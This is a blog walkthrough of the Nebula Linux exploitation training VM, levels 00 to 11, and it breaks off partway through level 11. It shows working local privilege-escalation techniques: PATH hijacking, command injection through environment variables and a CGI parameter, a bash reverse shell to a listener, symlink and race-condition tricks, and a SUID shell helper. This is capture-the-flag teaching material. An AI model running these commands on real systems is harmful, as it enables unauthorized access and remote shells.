---
layout: post
title: Nebula Walkthrough
---

Nebula is a virtual machine from [Exploit Exercises][exploit-exercises] that
goes through basic local Linux exploitation. Quoting from the website,

> Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at
> * SUID files
> * Permissions
> * Race conditions
> * Shell meta-variables
> * $PATH weaknesses
> * Scripting language weaknesses
> * Binary compilation failures
>
> At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.

Most of the levels are basic but there are a few levels that goes through
interesting techniques. While there are already plenty of writeups for Nebula,
this blog post will document my attempt.

The sha1sum of the ISO I am working with is e82f807be06100bf3e048f82e899fb1fecc24e3a.

# level 00

This level requires us to find a Set User ID program that will run as the
“flag00” account.

We can do this with the `find` utility.

```shell
level00@nebula:~$ find / -user flag00 -perm -4000 -print 2> /dev/null
/bin/.../flag00
/rofs/bin/.../flag00
```

Running the `/bin/.../flag00` binary escalates us to the flag00 user.

```shell
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ whoami
flag00
flag00@nebula:~$ id
uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 01

We are given the below source code containing a vulnerability.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

[`/usr/bin/env`][gnu-coreutils-env] runs a command in a modified environment.
The command is looked up via `PATH`. We can exploit this by modifying `PATH` to
point to an `echo` binary that runs code that we control.

First, we write a `shell.c` that will executes `/bin/bash`. We will be reusing
this piece of code often in this exercise.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

We compile `shell.c`.

```shell
level01@nebula:~$ gcc -o /home/level01/echo /tmp/shell.c
```

Setting `PATH` to look up `/home/level01` first will make the
`/home/flag01/flag01` binary execute `/home/level01/echo` instead of
`/bin/echo`

```shell
level01@nebula:~$ PATH=/home/level01:$PATH /home/flag01/flag01
flag01@nebula:~$ whoami
flag01
flag01@nebula:~$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
flag01@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 02

We are given the below source code containing a vulnerability.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

This is a classic command injection where the value of the `USER` environmental
variable is passed directly into the `system()` function.

```shell
level02@nebula:~$ USER=";/bin/bash #" /home/flag02/flag02
about to call system("/bin/echo ;/bin/bash # is cool")

flag02@nebula:~$ whoami
flag02
flag02@nebula:~$ id
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 03

For this level, we are told to check the home directory of flag03. We are also
told that there is a crontab that is called every couple of minutes.

```shell
level03@nebula:~$ ls -lah /home/flag03/
total 5.5K
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     260 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
```

We see a world writable `writable.d` directory and a `writable.sh` script
containing the following:

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It appears that a crontab runs `writable.sh` which executes all the scripts in
the `writable.d` directory. To confirm this, we create the following script in
the `writable.d` directory:

```bash
echo "test" >> /tmp/testme
```

After a while, we notice that the file
`/tmp/testme` was created and that it belongs to the flag03 user. This confirms
that all the scripts in the `writable.d` directory will be run as the flag03
user.

```shell
level03@nebula:~$ ls -lah /tmp
total 20K
drwxrwxrwt 6 root    root     200 2017-12-26 08:06 .
drwxr-xr-x 1 root    root     220 2017-12-26 06:52 ..
-rw-rw-r-- 1 flag03  flag03     5 2017-12-26 08:06 testme
drwxrwxrwt 2 root    root      40 2017-12-26 06:52 VMwareDnD
drwx------ 2 root    root     100 2017-12-26 06:52 vmware-root
drwxrwxrwt 2 root    root      40 2017-12-26 06:52 .X11-unix
```

To exploit this, we can add a script in `writable.d` that gets the flag03
user to compile a SUID shell binary.

We reuse the `shell.c` file from level 01.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

Next, we add the following script to the `writable.d` directory:

```bash
gcc -o /home/flag03/shell /tmp/shell.c
chmod 4777 /home/flag03/shell
```

The script compiles the `shell.c` file into a `shell` binary and sets the SUID
bit.

After a while, we get a `shell` binary in `/home/flag03`.

```shell
level03@nebula:~$ ls -lah /home/flag03
total 14K
drwxr-x--- 1 flag03 level03   80 2017-12-26 08:15 .
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
-rwsrwxrwx 1 flag03 flag03  7.2K 2017-12-26 08:15 shell
drwxrwxrwx 1 flag03 flag03    40 2017-12-26 08:15 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
```

Running it gets us a shell as the flag03 user.

```shell
level03@nebula:~$ /home/flag03/shell
flag03@nebula:~$ whoami
flag03
flag03@nebula:~$ id
uid=996(flag03) gid=1004(level03) groups=996(flag03),1004(level03)
flag03@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 04

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

The goal of this level is to read the `token` file.

```shell
level04@nebula:~$ ls -lah /home/flag04
total 13K
drwxr-x--- 2 flag04 level04   93 2011-11-20 21:52 .
drwxr-xr-x 1 root   root     300 2012-08-27 07:18 ..
-rw-r--r-- 1 flag04 flag04   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag04 flag04  3.3K 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag04 level04 7.3K 2011-11-20 21:52 flag04
-rw-r--r-- 1 flag04 flag04   675 2011-05-18 02:54 .profile
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```

The binary disallows opening files whose names contain the string "token"
through the `strstr()` check.

```shell
level04@nebula:~$ /home/flag04/flag04 /home/flag04/token
You may not access '/home/flag04/token'
```

We can bypass the check by creating a symlink to `/home/flag04/token` that
does not contain the string "token" and open that instead.

```shell
level04@nebula:~$ ln -s /home/flag04/token /tmp/foobar
level04@nebula:~$ /home/flag04/flag04 /tmp/foobar
06508b5e-8909-4f38-b630-fdb148a848a2
```

The string in the token file is the password for the flag04 user.

```shell
level04@nebula:~$ su - flag04
Password:
flag04@nebula:~$ whoami
flag04
flag04@nebula:~$ id
uid=995(flag04) gid=995(flag04) groups=995(flag04)
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 05

For this level, we are told to check the home directory of flag05. We are also
told to look out for weak directory permissions.

```shell
level05@nebula:~$ ls -lah /home/flag05
total 5.0K
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     320 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

We notice a world-readable `.backup` directory.

```shell
level05@nebula:~$ ls -lah /home/flag05/.backup/
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz
```

We copy and extract the archive.

```shell
level05@nebula:~$ mkdir flag05_backup
level05@nebula:~$ cp /home/flag05/.backup/backup-19072011.tgz flag05_backup/
level05@nebula:~$ cd flag05_backup/
level05@nebula:~/flag05_backup$ tar xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

The archive looks like a copy of `/home/flag05/.ssh`. We see that the content
of `id_rsa.pub` is the same as the content of `authorized_keys`.

```shell
level05@nebula:~/flag05_backup$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs
level05@nebula:~/flag05_backup$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs
```

Given that,
we should be able to `ssh` in as the flag05 user using the corresponding
`id_rsa` private key.

```shell
level05@nebula:~/flag05_backup$ ssh -i .ssh/id_rsa flag05@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

flag05@nebula:~$ whoami
flag05
flag05@nebula:~$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 06

For this level, we are told the flag06 account credentials came from a legacy
unix system. In legacy unix systems, the password hash is stored in the
world-readable /etc/passwd file.

```shell
level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

We make a copy of `/etc/passwd` and pass it to `john` to crack the password.
```shell
root@kali:/mnt/hgfs/Share# john passwd
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 DONE 2/3 (2017-11-30 08:12) 16.66g/s 12500p/s 12500c/s 12500C/s 123456..marley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Having cracked the password hash, we are able to login with the password
"hello".

```shell
level06@nebula:/home/flag06$ su - flag06
Password:
flag06@nebula:~$ whoami
flag06
flag06@nebula:~$ id
uid=993(flag06) gid=993(flag06) groups=993(flag06)
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 07

We are given the below source code.

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

There is a command injection in this script where the value of the `"Host"`
parameter is passed directly into a `system()` call which in perl can be done
through backticks (`` ` ``).

To exploit this, we will execute a command on the Nebula system to obtain a
reverse shell. This is a technique we will be using often in this exercise. We
start by setting up a netcat listener.

```shell
ncat -nlvp 8000

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5F3F 6ECC 75A2 4FF9 C358 2913 09FF 5C75 6D50 F5A4
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
```

The reverse shell we will be using is a bash based one:

```
bash -i >& /dev/tcp/192.168.144.1/8000 0>&1
```

We make a HTTP request with `curl`. The `Host` parameter is a URL encoded
`127.0.0.1; bash -i >& /dev/tcp/192.168.144.1/8000 0>&1;` string.

```shell
curl http://192.168.144.191:7007/index.cgi\?Host\=127.0.0.1%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.144.1%2F8000%200%3E%261%3B%0D%0A
```

We obtain a shell with our listener.

```shell
Ncat: Connection from 192.168.144.192.
Ncat: Connection from 192.168.144.192:53371.
bash: no job control in this shell
flag07@nebula:/home/flag07$ whoami
whoami
flag07
flag07@nebula:/home/flag07$ id
id
uid=992(flag07) gid=992(flag07) groups=992(flag07)
flag07@nebula:/home/flag07$ getflag
getflag
You have successfully executed getflag on a target account
```

# level 08

For this level, we are told to check for world-readable files.

```shell
level08@nebula:~$ ls -lah /home/flag08
total 14K
drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8.2K 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
```

We see a world-readable `capture.pcap` file. We download and open it in
Wireshark for analysis. Following the TCP stream, we see what appears to be
a login sequence over a virtual terminal. `7f` is the DEL character in ASCII
which will correspond with the backspace key being entered.

![Wireshark image](../images/nebula-wireshark.png)

That would mean that the password being used is "backd00Rmate". Using that as
the password proved to be successful.

```shell
level08@nebula:~$ su - flag08
Password:
flag08@nebula:~$ whoami
flag08
flag08@nebula:~$ id
uid=991(flag08) gid=991(flag08) groups=991(flag08)
flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 09

We are given the below source code.

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

There is a C setuid wrapper that runs the PHP script.

```shell
level09@nebula:~$ /home/flag09/flag09
PHP Notice:  Undefined offset: 1 in /home/flag09/flag09.php on line 22
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13
```

**The Cheese Method**

This first method is not the intended way to complete this level. The C setuid
wrapper appears to be a modified `php` binary.

```shell
level09@nebula:~$ /home/flag09/flag09 -h
Usage: php [options] [-f] <file> [--] [args...]
       php [options] -r <code> [--] [args...]
       php [options] [-B <begin_code>] -R <code> [-E <end_code>] [--] [args...]
       php [options] [-B <begin_code>] -F <file> [-E <end_code>] [--] [args...]
       php [options] -- [args...]
       php [options] -a

  -a               Run as interactive shell
  -c <path>|<file> Look for php.ini file in this directory
  -n               No php.ini file will be used
  -d foo[=bar]     Define INI entry foo with value 'bar'
  -e               Generate extended information for debugger/profiler
  -f <file>        Parse and execute <file>.
  -h               This help
  -i               PHP information
  -l               Syntax check only (lint)
  -m               Show compiled in modules
  -r <code>        Run PHP <code> without using script tags <?..?>

... snip ...
```

In particular, there are options (`-a`, `-r` and `-f` in particular) that
allows for execution of arbitrary PHP code. We can abuse this to get a flag09
shell.

```shell
level09@nebula:~$ /home/flag09/flag09 -r "system('/bin/sh');"
sh-4.2$ whoami
flag09
sh-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

**The Normal Method**

The PHP script reads a file with the following format and does some string
replacements via regex before printing it out.

```text
[email address@domain.com]
```

The intended vulnerability in the PHP script is the following line:

```php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

The `/e` in the first parameter of `preg_replace` is a [PCRE modifier][pcre-modifier]
that instructs `preg_replace` to `eval()` the second parameter as PHP code
after doing the normal substitution of backreferences.

More specifically, the `address@domain.com` component of the file will be
`eval()` as PHP code due to the `\2` backreference.

However, complicating the exploit is the fact that certain characters will be
escaped. Quoting from the documentation:

> Single quotes, double quotes, backslashes (\) and NULL chars will be escaped
> by backslashes in substituted backreferences.

After some experimenting, we end up with the following file that executes with
`system()` the value of the `$use_me` variable, which according to the script
is assigned the value of the second argument to the `flag09` binary.

```shell
level09@nebula:~$ cat /home/level09/text
[email {${system($use_me)}}]
```

Putting the pieces together:

```shell
level09@nebula:~$ /home/flag09/flag09 text /bin/sh
sh-4.2$ whoami
flag09
sh-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

# level 10

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

This is a classic time of check to time of use (TOCTTOU) vulnerability. The
`access()` function call checks the real UID of the process to determine if
the user is able to access a file while the `open()` function call uses the
effective UID instead.

The goal here is to use the `flag10` binary to read the `token` file.

```shell
level10@nebula:~$ ls -lah /home/flag10
total 14K
drwxr-x--- 2 flag10 level10   93 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
-rw-r--r-- 1 flag10 flag10   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag10 flag10  3.3K 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag10 level10 7.6K 2011-11-20 21:22 flag10
-rw-r--r-- 1 flag10 flag10   675 2011-05-18 02:54 .profile
-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token

level10@nebula:~$ /home/flag10/flag10 /home/flag10/token 192.168.144.1
You don't have access to /home/flag10/token
```

We can race the program by getting it to read a symlink that initially points
to a file owned by the real UID (level09) and changing that symlink to point
to the `token` file after the `access()` function call and before the `open()`
function call.

We start by setting up a listener on port 18211 to receive the token file. We
use the `-k` flag to keep the listener alive between connections.

```shell
% ncat -nlvkp 18211

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 67C3 CB2E CE15 70FF E1BE BF0D 07B7 8B49 7FCD 1DB9
Ncat: Listening on :::18211
Ncat: Listening on 0.0.0.0:18211
```

On the Nebula system, we open two terminals. On the first terminal, we run a
loop that constantly swaps the `/tmp/token` symlink between pointing to
`/tmp/faketoken` and `/home/flag10/token`.

```shell
level10@nebula:~$ touch /tmp/faketoken
level10@nebula:~$ while :; do ln -fs /tmp/faketoken /tmp/token; ln -fs /home/flag10/token /tmp/token; done
```

On the second terminal, we constantly run the `flag10` binary against
`/tmp/token`.

```shell
while :; do /home/flag10/flag10 /tmp/token 192.168.144.1 ; done
```

We will eventually see the token being sent to our listener.
```shell
... snip ...
Ncat: Connection from 192.168.144.191:57857.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
... snip ...
```

Like in previous levels, the string in the token file is the password for the
flag10 user.

```shell
level10@nebula:~$ su - flag10
Password:
flag10@nebula:~$ whoami
flag10
flag10@nebula:~$ id
uid=989(flag10) gid=989(flag10) groups=989(flag10)
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 11

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, "reading from stdin");
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, "invalid header");
  }

  length = atoi(line + strlen(CL));

  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }

}
```

We are told that there are two ways of completing this level. In the main
function, we see two branches that executes the `process()` function which
contains a `system()` function call.

We first look at the branch that gets executed when `Content-Length` is more
than or equals to 1024.

We see that this branch essentially gets a random file, writes the content of
`stdin` into the file, `mmap`'s the file content into a `char` array that is
passed into the `process()` function. The process function then decodes the
`char` array before passing it into the `system()` function call.

The decoding scheme in `process()` involves XORing each character in sequence
with a key value. The inital key value is derived from the value of
`Content-Length` and each subsequent key is derived by subtracting the output
of the `XOR` operating from the existing key. Knowing this, we can easily write
a script to do the correct encoding of the command.

First we prepare our `shell.c`.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

Next, we write a script that encodes the command we want to run.

```python
def encode(command, key):
    ret = []
    for i in command:
        enc = (ord(i) ^ key) & 0xff
        ret.append(chr(enc))
        key = (key - ord(i)) & 0xff

    return "".join(ret)


def main():
    command = "gcc -o /home/flag11/shell /tmp/shell.c; chmod +s /home/flag11/shell\x00"
    length = 1024
    key = length & 0xff

    cmd = encode(command, key)
    print "Content-Length: " + str(length) + "\n" + cmd + "A"*(length - len(cmd))


if __name__ == "__main__":
    main()
```

We attempt to run out exploit. We have to change the `TEMP` environmental
variable to point to a location where we can read and write to files.

```shell
level11@nebula:~$ export TEMP=/tmp
level11@nebula:~$ python level11.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
/usr/bin/ld: cannot open output file /home/flag11/shell: Permission denied
collect2: ld returned 1 exit status
chmod: changing permissions of `/home/flag11': Operation not permitted
```

However, we encounter a permissions error when we try to write to
`/home/flag11/shell`. This is odd because our binary is a SUID binary.

```shell
level11@nebula:~$ ls -lah /home/flag11
total 17K
drwxr-x--- 1 flag11 level11   40 2012-08-20 18:58 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag11 flag11   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag11 flag11  3.3K 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag11 level11  12K 2012-08-19 20:55 flag11
-rw-r--r-- 1 flag11 flag11   675 2011-05-18 02:54 .profile
drwxr-xr-x 2 flag11 flag11     3 2012-08-27 07:15 .ssh
```

Running the binary under `strace`, we see an explicit call to `setuid32` and
`setgid32` that drops privileges back to the level11 user.

```shell
level11@nebula:~$ python level11.py | strace /home/flag11/flag11
... snip ...
getgid32()                              = 1012
setgid32(1012)                          = 0
getuid32()                              = 1012
setuid32(1012)                          = 0
... snip ...
```

However, we see that the the `setuid32` and `setgid32` calls only happens
*after* the `mmap` happens. This means that we can potentially write to a
flag11 owned file or directory if we can guess the random file that the
`getrand` function generates.

```c
/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();

  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}
```

Looking at the `getrand` function, the file name is relatively predictable as
it consists of a path determined by the `TEMP` environmental variable, the PID
of the calling process and a random number generated by a PRNG seeded with the
current time. On Linux, PID numbers are assigned sequentially on a system wide
basis.

